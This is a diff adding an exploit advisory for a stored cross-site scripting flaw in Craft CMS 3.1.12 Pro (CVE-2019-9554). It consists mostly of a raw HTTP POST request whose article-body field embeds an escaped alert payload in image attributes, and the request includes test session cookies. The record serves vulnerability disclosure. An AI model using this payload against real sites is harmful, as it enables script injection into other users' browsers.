@@ -1,0 +1,31 @@
+# Exploit Title: Craft CMS 3.1.12 Pro - Cross-Site Scripting
+# Date: 2019-03-04
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://craftcms.com/
+# Software Link : https://github.com/craftcms/cms
+# Software : Craft CMS 3.1.12 Pro
+# Version : 3.1.12 Pro
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : CVE-2019-9554
+
+# In the 3.1.12 Pro version of the Craft CMS web application, the XSS vulnerability has been discovered
+# in the header insertion field when adding source code.
+ 
+# HTTP POST Request :
+
+POST /XXX/s/admin/entries/news/258-craft-cms-3-1-12-pro-xss-test HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://localhost/XXX/s/admin/entries/news/258-craft-cms-3-1-12-pro-xss-test
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1936
+DNT: 1
+Connection: close
+Cookie: CraftSessionId=2ea7nf0jqr0dtl3ioesmlpibfn; CRAFT_CSRF_TOKEN=deccdc1b2ef00dd8580186987fe54e3cdf92305c6150cffb523f392540a2d4aba%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A208%3A%22iuw8Yd67pzxgeP7PrY9zqL5nYEB0Uor6JeS779fM%7Cf42be7b0c353ba14582c1e682a6150947da39c970d31f5cbc3ddc4c0bbe14608iuw8Yd67pzxgeP7PrY9zqL5nYEB0Uor6JeS779fM%7C1%7C%242a%2413%245j8bSRoKQZipjtIg6FXWR.kGRR3UfCL.QeMIt2yTRH1.hCNHLQKtq%22%3B%7D; 1031b8c41dfff97a311a7ac99863bdc5_identity=9804f2668edfba25525881f3badabcfe5adb1d71f4dcb4504daee11a78bc94a3a%3A2%3A%7Bi%3A0%3Bs%3A41%3A%221031b8c41dfff97a311a7ac99863bdc5_identity%22%3Bi%3A1%3Bs%3A197%3A%22%5B%221%22%2C%22%5B%5C%22dQCnIq3FbN0KsbTg8nbPQxV3JvEWqbBzqXjf0nwbvJDN0LjgArYGZe4WaYfo3AiYzm8CaeKPjT9CUw_8mnAd_D89-nf39hYXRRoq%5C%22%2Cnull%2C%5C%22Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A65.0%29+Gecko%2F20100101+Firefox%2F65.0%5C%22%5D%22%2C3600%5D%22%3B%7D; 1031b8c41dfff97a311a7ac99863bdc5_username=53dcb198f73d427f239351d0c5ac1bb1e4fbba88fab3cc128854b0232098896da%3A2%3A%7Bi%3A0%3Bs%3A41%3A%221031b8c41dfff97a311a7ac99863bdc5_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D
+Upgrade-Insecure-Requests: 1
+
+CRAFT_CSRF_TOKEN=dgLN-H1XWhJgLIiYSYl52Z4wVJZttVH_wDyF9k5Bi00GXCSSTri7oLF9innUOlavPu4AhcUUuEoHMpGSl7-GbdK9oBrDQT5p3BN2frKMuzd6IgTMdbWhgSXqx6pj4hV1UyLi8rZBnAqaMQT1eP_1_4X0fqZYp5Q4GfmlV7iq26NdVxnY_X03CauMkmElBmRoa-6A_U8FGYjg2ipWdesOvZa18UZsUHMNWUWBmYzHJc-82MSRtiZ19DS1iTzV74nlnSaY3vva5oBQFEDtnwZhqR93usAkM2wlEFbw_yzZTonsaW3sHPlkkZl5x8YbLvl7TDl3pXmB3e3NG75Ltl9hzQ6NM7D2dtl7MwepoPSO41vqj8Es8nQOUOgkEh-BtdgOTRJg_0TTlOJHifTOB4EhFmNAgJeHdao6olhxgkCmkcmyhATeP8LED0mL_G7C25eWMw5cms0oWHudxvcyEjFdDiaSsYFrN3is0ekOYx_TbO7E2roXNjkDZy0M5q_Kn3KdkrODw-QVIJJ3-adtsKLAka9fzIyz68joE1oIoc5NFdg%3D&action=entries%2Fsave-entry&redirect=ac40ade69b3fe7bc96c8157907aae4128d2b64f411148be4af2141edea85b42fentries%2Fnews&sectionId=2&entryId=258&title=Craft+CMS+3.1.12+Pro+-+XSS+TEST&fields%5BfeaturedEntry%5D=&fields%5BfeaturedImage%5D=&fields%5BshortDescription%5D=%3Cp%3ECraft+CMS+3.1.12+Pro+-+XSS+TEST%3C%2Fp%3E&fields%5Bheading%5D=Craft+CMS+3.1.12+Pro+-+XSS+TEST&fields%5Bsubheading%5D=Craft+CMS+3.1.12+Pro+-+XSS+TEST&fields%5BarticleBody%5D=&fields%5BarticleBody%5D%5B259%5D%5Btype%5D=text&fields%5BarticleBody%5D%5B259%5D%5Benabled%5D=1&fields%5BarticleBody%5D%5B259%5D%5Bfields%5D%5Btext%5D=%3Cfigure%3E%3Ca+href%3D%22%22%3E%3Cimg+src%3D%22https%3A%2F%2Fdemo.craftcms.com%2F3Rdj0OGqru%2Fs%2Fassets%2Fsite%2F-.png%23asset%3A257%3Aurl%22+alt%3D%22%26quot%3B%3Ealert%28%26quot%3Bismailtasdelen%26quot%3B%29%22+title%3D%22%26quot%3B%3Ealert%28%26quot%3Bismailtasdelen%26quot%3B%29%22+data-image%3D%228ilh6edpse56%22%3E%3C%2Fa%3E%3Cfigcaption%3E%22%26gt%3B%3C%2Ffigcaption%3E%3C%2Ffigure%3E&fields%5BarticleBody%5D%5B259%5D%5Bfields%5D%5Bposition%5D=left&typeId=2&slug=craft-cms-3-1-12-pro-xss-test&author=&author%5B%5D=1&postDate%5Bdate%5D=3%2F4%2F2019&postDate%5Btimezone%5D=UTC&postDate%5Btime%5D=8%3A55+AM&postDate%5Btimezone%5D=UTC&expiryDate%5Bdate%5D=&expiryDate%5Btimezone%5D=UTC&expiryDate%5Btime%5D=&expiryDate%5Btimezone%5D=UTC&enabled=1&revisionNotes=
